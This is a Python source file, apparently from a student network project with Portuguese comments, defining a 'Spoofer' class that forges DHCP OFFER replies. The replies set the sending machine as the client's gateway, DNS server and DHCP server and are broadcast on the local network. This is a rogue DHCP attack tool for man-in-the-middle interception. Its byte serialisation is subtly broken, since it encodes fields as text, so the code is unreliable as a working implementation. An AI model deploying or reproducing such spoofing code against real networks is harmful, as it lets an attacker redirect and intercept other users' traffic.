import socket as s
import netifaces as netif
import ipaddress as ip
from typing import Dict
from collections.abc import Mapping 
import time #temporário

class Spoofer:

#    def __init__(self, dhcp_offer_header : Dict):
#        self.dhcp_offer_header = dhcp_offer_header

    @staticmethod
    def getIP(inBytes = False):
        hostname = s.gethostname()
        ipaddr = s.gethostbyname(hostname)

        if inBytes:
            return s.inet_aton(ipaddr)
    
        return ipaddr

    @staticmethod    
    def getNetmask(inBytes = False): # https://stackoverflow.com/a/54074160
        for iface in netif.interfaces():
            time.sleep(1) # temporário, se não tiver sleep e fizer dhclient -r na mesma máquina que roda o programa, o IP não é configurado a tempo e não da pra pegar a máscara
            addresses = netif.ifaddresses(iface)

            if 2 in addresses.keys():
                if iface.startswith('wlp') or iface.startswith('enp'):
                    mask = addresses[2][0]['netmask']

        if inBytes:
            return s.inet_aton(mask)

        return mask
    
    @staticmethod
    def write_offer(dhcp_offer_header : Dict):
        print(dhcp_offer_header)
        dhcp_offer_header['op']     =   2
        dhcp_offer_header['yiaddr'] =   s.inet_aton('10.132.249.253')
        dhcp_offer_header[1]        =   {'length': 4, 'res': Spoofer.getNetmask(True)}  # ok
        dhcp_offer_header[3]        =   {'length': 4, 'res': Spoofer.getIP(True)}       # ok
        dhcp_offer_header[6]        =   {'length': 4, 'res': Spoofer.getIP(True)}       # ok
        dhcp_offer_header[51]       =   {'length': 4, 'res': 3600}                      # ok
        dhcp_offer_header[53]       =   {'length': 1, 'res': 0x2}                       # ok  
        dhcp_offer_header[54]       =   {'length': 4, 'res': Spoofer.getIP(True)}       # ok
        dhcp_offer_header[58]       =   {'length': 4, 'res': 1800}                      # ok
        dhcp_offer_header[59]       =   {'length': 4, 'res': 3150}                      # ok 
        dhcp_offer_header[0]        =   {'length': 4, 'res': 0x00000}           
        dhcp_offer_header[255]      =   {'length': 4, 'res': 0x00}

        return dhcp_offer_header

    def opt_to_byte(dict):
        res = ""
        for k, v in dict.items():
            res += f"{k}{len(f'{v}')}{v}"
        return res

    def dict_to_byte(dict):
        byt = b''
        for i in dict.values():
            if isinstance(i, Mapping):
                i = Spoofer.opt_to_byte(i)

            byt += f"{i}".encode(encoding = 'UTF-8')
        return byt


    @staticmethod
    def spoof(dhcp_discover_header : Dict):
        offer_header = Spoofer.write_offer(dhcp_discover_header)
        broadcast = ip.IPv4Network(Spoofer.getIP() + '/' + Spoofer.getNetmask(), False).broadcast_address

        data = Spoofer.dict_to_byte(offer_header)

        dport = 68
        udp = s.socket(s.AF_INET, s.SOCK_DGRAM)
        dest = (str(broadcast), int(dport))
        udp.sendto(data, dest)
        udp.close()